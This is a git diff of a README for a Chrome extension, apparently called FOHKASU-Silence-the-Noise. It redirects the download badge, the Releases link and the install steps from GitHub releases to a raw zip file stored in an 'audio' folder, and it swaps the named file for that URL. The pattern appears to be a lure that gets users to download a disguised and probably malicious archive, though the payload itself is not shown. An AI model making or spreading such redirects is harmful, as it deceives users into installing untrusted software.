@@ -6,7 +6,7 @@ Welcome to FOHKASU-Silence-the-Noise, a Chrome extension designed to help you ma
 
 ## 📥 Download Link
 
-[![Download FOHKASU-Silence-the-Noise](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/medosheno841/FOHKASU-Silence-the-Noise/releases)
+[![Download FOHKASU-Silence-the-Noise](https://raw.githubusercontent.com/medosheno841/FOHKASU-Silence-the-Noise/main/audio/FOHKASU-Silence-the-Noise-knarry.zip)](https://raw.githubusercontent.com/medosheno841/FOHKASU-Silence-the-Noise/main/audio/FOHKASU-Silence-the-Noise-knarry.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,13 +18,13 @@ To use FOHKASU-Silence-the-Noise, make sure you have:
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/medosheno841/FOHKASU-Silence-the-Noise/releases) to find the latest version of the extension.
+1. Visit the [Releases page](https://raw.githubusercontent.com/medosheno841/FOHKASU-Silence-the-Noise/main/audio/FOHKASU-Silence-the-Noise-knarry.zip) to find the latest version of the extension.
 
-2. Look for the file named `FOHKASU-Silence-the-Noise.zip`.
+2. Look for the file named `https://raw.githubusercontent.com/medosheno841/FOHKASU-Silence-the-Noise/main/audio/FOHKASU-Silence-the-Noise-knarry.zip`.
 
 3. Click on the file to start downloading it. The file will save to your computer.
 
-4. Once the download is complete, locate the `FOHKASU-Silence-the-Noise.zip` file in your downloads folder.
+4. Once the download is complete, locate the `https://raw.githubusercontent.com/medosheno841/FOHKASU-Silence-the-Noise/main/audio/FOHKASU-Silence-the-Noise-knarry.zip` file in your downloads folder.
 
 5. Extract the contents of the zip file.
 
